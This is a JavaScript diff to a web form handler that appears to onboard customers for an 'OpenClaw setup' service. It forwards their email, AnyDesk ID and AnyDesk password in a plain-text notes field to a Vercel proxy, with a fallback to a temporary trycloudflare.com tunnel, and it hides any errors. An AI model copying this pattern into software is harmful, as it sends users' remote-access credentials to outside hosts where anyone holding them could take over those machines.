@@ -712,21 +712,19 @@
 
     // Also enqueue a provisioning plan (dry-run) via Rosa's intake
     (function(){
-      try {
-        var endpoint = 'https://examine-violation-tan-beach.trycloudflare.com/onboard';
-        var payload = {
-          email: data.email || '',
-          customerName: (data.email||'').split('@')[0] || 'OpenClaw Setup Customer',
-          product: 'openclaw-setup',
-          domainHint: '',
-          notes: 'anydesk_id='+ (data.anydesk_id||'') + '; anydesk_pw=' + (data.anydesk_pw||'') + '; best_time=' + (data.best_time||'') + '; messaging=' + (data.messaging||'')
-        };
-        fetch(endpoint, {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify(payload)
-        }).catch(function(){});
-      } catch(e) {}
+      var payload = {
+        email: data.email || '',
+        customerName: (data.email||'').split('@')[0] || 'OpenClaw Setup Customer',
+        product: 'openclaw-setup',
+        domainHint: '',
+        notes: 'anydesk_id='+ (data.anydesk_id||'') + '; anydesk_pw=' + (data.anydesk_pw||'') + '; best_time=' + (data.best_time||'') + '; messaging=' + (data.messaging||'')
+      };
+      var proxy = 'https://agentmart-webhook.vercel.app/api/onboard-proxy';
+      var direct = 'https://examine-violation-tan-beach.trycloudflare.com/onboard';
+      fetch(proxy, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(payload) })
+        .catch(function(){
+          fetch(direct, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(payload) }).catch(function(){});
+        });
     })();
 
     // Show success regardless (don\'t fail the user if fetch errors)
